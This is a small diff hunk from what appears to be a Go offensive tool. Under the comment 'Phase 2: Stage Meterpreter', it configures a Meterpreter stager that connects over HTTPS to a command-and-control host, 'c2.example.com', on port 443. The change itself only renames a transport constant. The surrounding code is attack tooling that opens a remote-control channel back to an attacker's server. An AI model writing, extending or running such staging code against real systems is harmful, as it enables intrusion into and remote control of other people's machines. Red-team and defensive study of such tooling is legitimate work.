@@ -145,7 +145,7 @@ func main() {
 
     // Phase 2: Stage Meterpreter
     stager := meterpreter.NewStager(&meterpreter.Config{
-        Transport: meterpreter.TransportHTTPS,
+        Transport: meterpreter.HTTPS,
         Host:      "c2.example.com",
         Port:      "443",
         Timeout:   30 * time.Second,
